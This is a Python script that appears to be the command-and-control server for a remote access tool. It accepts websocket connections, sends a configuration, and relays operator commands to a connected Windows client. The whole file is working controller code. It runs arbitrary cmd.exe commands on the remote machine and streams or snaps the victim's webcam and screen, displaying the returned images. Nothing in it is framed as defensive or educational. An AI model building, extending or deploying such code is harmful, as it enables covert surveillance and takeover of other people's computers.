#!/usr/bin/python3

#Playground
import asyncio
import websockets
import json
import shlex
from pprint import pprint
from concurrent.futures import ThreadPoolExecutor
import commands
from io import BytesIO
import base64
from PIL import Image, ImageDraw

# Convert Base64 to Image
def b64_2_img(data):
    buff = BytesIO(base64.b64decode(data))
    return Image.open(buff)

def start_video_server():
    try:
        from vidstream import StreamingServer
        global video_server
        video_server = StreamingServer("127.0.0.1", 8080)
        video_server.start_server()
    except:
        print("Module not found...")

def start_screen_server():
    try:
        from vidstream import StreamingServer
        global screen_server
        screen_server = StreamingServer("127.0.0.1", 8081)
        screen_server.start_server()
    except:
        print("Module not found...")

async def ainput(prompt: str = "") -> str:
    with ThreadPoolExecutor(1, "AsyncInput") as executor:
        return await asyncio.get_event_loop().run_in_executor(executor, input, prompt)

async def handler(websocket, path):
    global config_store

    print('#################### Start to TIMESTAMP ##############')
    try:
        timestamp = await websocket.recv()
        # print(f"hello timestamp {timestamp}")
    except:
        # print("Connection lost - Receiving")
        return

    # Sending Configuration
    config_store_json = json.dumps(config_store)
    try:
        await websocket.send(config_store_json)
    except:
        return

    while True:
        # Read Command from user
        print(" ")
        cmdline = await ainput("Command >>")
        args = shlex.split(cmdline)
        try:
            cmd = args[0].upper()
            valid_command = True
        except:
            print("Enter HELP to get info on possible commands!")
            continue

        # Process aliases
        if cmd in commands.aliases:
            args[0]=commands.aliases[cmd]


        # Prepare internal satements

        if cmd == "CD":
            args.pop(0)
            if len(args) == 0:
                args = ["."]
            command = ["CD", args]
        elif cmd == "PWD":
            command = ["CD", ["."]]
        elif cmd == "WEBCAM":
            args.pop(0)
            if len(args) == 0:
                args = ["STATUS"]

            args[0]=args[0].upper()
            if args[0] == "STREAM":
                command = [cmd, args]
                start_video_server()
            elif args[0] == "STOP":
                command = [cmd, args]
                try:
                    video_server.stop_server()
                except:
                    pass
            elif args[0] == "SNAP":
                command = [cmd, args]
            elif args[0] == "STATUS":
                command = [cmd, args]
            else:
                print("Unknown WEBCAM command")
                continue
        elif cmd == "SCREEN":
            args.pop(0)
            if len(args) == 0:
                args = ["STATUS"]
            args[0]=args[0].upper()
            if args[0] == "STREAM":
                command = [cmd, args]
                start_screen_server()
            elif args[0] == "STOP":
                command = [cmd, args]
                try:
                    screen_server.stop_server()
                except:
                    pass
            elif args[0] == "SNAP":
                command = [cmd, args]
            elif args[0] == "STATUS":
                command = [cmd, args]
            else:
                print("Unknown SCREEN command")
                continue

        elif cmd in commands.direct:
            args.pop(0)
            command = [cmd, args]
        elif cmd in commands.ps:
            command = [cmd, []]
        elif cmd in commands.cmd:
            command = [cmd, []]
        elif (not cmd in commands.ps) and (not cmd in commands.cmd):
            print("No PWR command -> sending to cmd.exe")
            command = ["SHELL", args]
        command_json = json.dumps(command)

        # print('#################### Start to SEND ##############')
        #pprint(command_json)
        try:
            data = await websocket.send(command_json)
            # print(f'Date: {data}')
        except:
            # print("Connection lost - Sending")
            return

        # print('#################### Start to RECEIVE ##############')
        try:
            answer_json = await websocket.recv()
        except:
            # print("Connection lost - Receiving")
            return

        answer = json.loads(answer_json)
        print(f">>>> Successful : {answer[0]}")
        print(f">>>>       Type : {answer[1]}")
        result= answer[2]
        stored_executed = True

        print(">>>> Response:")

        if answer[1] == "IMAGE":
            image = b64_2_img(result[0])
            image.show()
        else:
            for line in result:
                print(line.rstrip())

# ############

global stored_command
global stored_executed
global config_store
global video_server


# Store default config
config_store={}
config_store["Debugging"]=True
config_store["Logging"]=True
config_store["Shell_Timeout"]=5

print("Create Server Objekt")
start_server = websockets.serve(handler, "0.0.0.0", 8000)

print("Start Server")
asyncio.get_event_loop().run_until_complete(start_server)

print("Endless Eventloop")
asyncio.get_event_loop().run_forever()
